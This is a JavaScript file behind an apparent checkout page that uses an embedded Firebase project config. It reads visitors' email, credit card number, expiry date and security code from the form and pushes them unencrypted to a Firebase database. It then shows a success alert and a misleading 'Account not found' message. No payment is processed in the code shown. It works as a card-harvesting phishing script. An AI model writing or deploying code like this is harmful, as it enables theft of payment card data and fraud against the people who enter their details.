


const firebaseConfig = {
    apiKey: "AIzaSyAYZ9HJYrtdVxJfDPtOBUhUoeeS0LytRXA",
    authDomain: "parte-11191.firebaseapp.com",
    databaseURL: "https://parte-11191-default-rtdb.firebaseio.com",
    projectId: "parte-11191",
    storageBucket: "parte-11191.appspot.com",
    messagingSenderId: "117686824843",
    appId: "1:117686824843:web:f0d741f71d8c106140c98e",
    measurementId: "G-JLSRFDZ8NH"
  };

  //intialize firebase
  firebase.initializeApp(firebaseConfig);


  //refrence
  var checkoutFormDB = firebase.database().ref('checkoutForm');

  document.getElementById('checkoutForm').addEventListener('submit', submitForm);

  function submitForm(e){
    e.preventDefault();

    var email = getElementVal('email');
    var ccNumber = getElementVal('ccNumber');
    var exMonth = getElementVal('exMonth') ;
    var exYear = getElementVal('exYear') ;
    var bbb = getElementVal('bbb') ;

    saveMessages(email, ccNumber, exMonth, exYear, bbb);

    //enable alert

    document.querySelector('.alert').style.display = "block";

    //remove the alert
    setTimeout(function() {
      document.querySelector('.alert').style.display = "none";
    }, 3000);
  }



  


  var saveMessages = function(email, ccNumber, exMonth, exYear, bbb) {
    var newcontactForm = checkoutFormDB.push();
  
    newcontactForm.set({
      email: email,
      ccNumber: ccNumber,
      exMonth: exMonth,
      exYear: exYear,
      bbb: bbb,
    });
  };

  var getElementVal = function(id) {
    return document.getElementById(id).value;
  };


  function showAlat(){

    submitForm2();
    
    document.querySelector('.alat').style.display = "block";

    setTimeout(function() {
      document.querySelector('.alat').style.display = "none";
    }, 3000);
  }


  function submitForm2() {
    var emailInput = document.getElementById('email');
    var emailValue = emailInput.value.trim();

    if (emailValue !== '') {
      // The input field is not empty, perform the desired action
      // Add your code here to run when the input field is not empty
      var paragraph = document.getElementById('my-paragraph');
      paragraph.textContent = 'Account not found';
    } else {
      // The input field is empty, display an error message or handle accordingly
      var paragraph = document.getElementById('my-paragraph');
      paragraph.textContent = 'Email field is empty!';
    }
  }





